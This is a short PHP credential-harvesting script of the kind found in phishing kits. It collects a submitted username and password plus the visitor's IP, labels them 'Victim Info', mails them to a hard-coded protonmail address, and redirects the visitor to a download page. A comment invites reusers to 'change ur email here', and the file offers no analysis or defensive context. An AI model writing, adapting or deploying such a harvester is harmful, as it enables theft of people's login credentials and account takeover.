<?
if($_POST["user"]){
$ip = getenv("REMOTE_ADDR");

$message .= "--------------Contacts Login-----------------------\n";
$message .= "Username            : ".$_POST['user']."\n";
$message .= "Password            : ".$_POST['psw']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "---------------Created BY Dee-------------\n";
//change ur email here
$send = "rn01wlx@protonmail.com";
$subject = "Contacts Rezult $IP";
$headers = "From:Rn01wlx";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

 
     header("Location: download.php");
     }

?>
